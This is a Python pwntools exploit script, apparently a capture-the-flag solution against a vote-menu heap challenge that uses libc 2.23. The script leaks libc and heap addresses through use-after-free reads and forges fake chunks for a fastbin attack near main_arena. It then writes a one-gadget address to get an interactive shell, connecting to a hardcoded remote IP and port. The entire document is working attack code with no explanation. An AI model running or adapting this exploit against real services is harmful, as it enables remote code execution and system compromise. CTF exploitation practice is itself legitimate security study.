# coding:utf-8
from pwn import *

libc = ELF("./libc-2.23.so")
LOCAL = True
if LOCAL:
    context.log_level = 'debug'
    io = remote("10.211.55.9", 22333)
    main_arena_off = 0x3c4b78
else:
    io = remote("47.90.103.10", 6000)

def mmenu(choice):
    io.recvuntil("Action: ")
    io.sendline(str(choice))

def create(msize, content):
    mmenu(0)
    io.recvuntil("the name's size: ")
    io.sendline(str(msize))
    io.recvuntil("Please enter the name: ")
    io.send(content)

def show(idx):
    mmenu(1)
    io.recvuntil("Please enter the index: ")
    io.sendline(str(idx))

def vote(idx):
    mmenu(2)
    io.recvuntil("Please enter the index: ")
    io.sendline(str(idx))

def result():
    mmenu(3)

def vcancel(idx):
    mmenu(4)
    io.recvuntil("Please enter the index: ")
    io.sendline(str(idx))

def pwnit():
    create(0xE8, 'a0\n')
    create(0x18, 'a1\n')
    create(0xE8, 'a2\n')
    create(0xE8, 'a3\n')
    create(0x58, 'a4\n')
    vcancel(0)
    vcancel(1)
    vcancel(2)
    show(0)
    io.recvuntil("count: ")
    libc.address = int(io.recvline()[:-1]) - main_arena_off
    log.success("libc address: " + hex(libc.address))
    io.recvuntil("time: ")
    heap_address  = int(io.recvline()[:-1]) - 0x130
    log.success("heap address: " + hex(heap_address))
    # pwn
    vcancel(3)
    fake_chunk = '5'*0xE0
    fake_chunk += p64(0) + p64(0x71)
    fake_chunk += p64(0xFFFFFFFFFFFFFFFF) + p64(0x555555)
    fake_chunk += '3'*0x58 + p64(0x91)
    fake_chunk += '\n'
    create(0x1E8, fake_chunk)
    vcancel(4)
    vcancel(3)
    vcancel(5)
    payload = '5'*0xE0 + p64(0)
    payload += p64(0x71) + p64(libc.address+main_arena_off-0x8b)
    payload += '\n'
    create(0x1E8, payload)
    pause()
    create(0x58, '6'+'\n')
    #payload = '7'*3 + p64(libc.address+0x4526a)
    payload = '7'*3 + p64(libc.address+0x6f5a6)
    payload += '\n'
    create(0x58, payload)
    # tigger
    mmenu(0)
    io.recvuntil("the name's size: ")
    io.sendline(str(0x58))
    io.interactive()

if __name__ == "__main__":
    pwnit()
    pause()

